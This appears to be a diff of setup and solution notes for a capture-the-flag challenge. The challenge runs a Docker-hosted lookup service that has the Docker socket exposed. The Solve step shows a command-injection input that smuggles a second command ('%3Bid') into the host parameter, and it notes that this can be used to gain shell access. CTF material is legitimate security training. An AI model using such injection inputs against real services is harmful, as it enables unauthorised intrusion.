@@ -3,7 +3,8 @@ Setup:
 2. Create flag in /opt/ctf/flag.txt
 3. Move inside "challenge", run "sudo docker compose up --build -d" # Dont forget to install docker
 4. Run "docker ps" to check if it's fine
-5. Go into docker and check "curl --unix-socket /var/run/docker.sock http://localhost/version" and "curl --unix-socket /var/run/docker.sock http://localhost/_ping" #if OK API works as it should
+5. Install alpine image --> sudo docker pull alpine
+6. Go into docker and check "curl --unix-socket /var/run/docker.sock http://localhost/version" and "curl --unix-socket /var/run/docker.sock http://localhost/_ping" #if OK API works as it should
 
 Solve:
 1. In the lookup field you can do command injection like so: curl "http://localhost:8080/lookup?host=google.com%3Bid" #Will look for ID #use this to get shell access
